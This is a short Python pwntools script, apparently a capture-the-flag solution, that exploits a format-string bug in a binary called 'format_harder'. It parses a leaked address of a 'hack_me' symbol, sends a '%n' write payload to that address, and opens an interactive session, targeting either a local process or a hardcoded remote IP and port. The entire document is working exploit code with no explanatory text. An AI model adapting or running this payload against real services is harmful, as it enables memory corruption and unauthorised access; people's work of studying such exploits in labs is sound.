#!/usr/bin/python

from pwn import *
import sys

def exploit(p):
    # get address hack_me.
    hack_me = int(p.recvuntil('\nOk').split()[-2], 16)
    info("hack_me address 0x%x" %hack_me)
    # create payload.
    buf  = p32(hack_me)
    buf += '%416x%9$n'
    p.sendline(buf)
    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        p = remote('128.199.104.41', 42069)
    else:
        p = process('./format_harder')
    exploit(p)
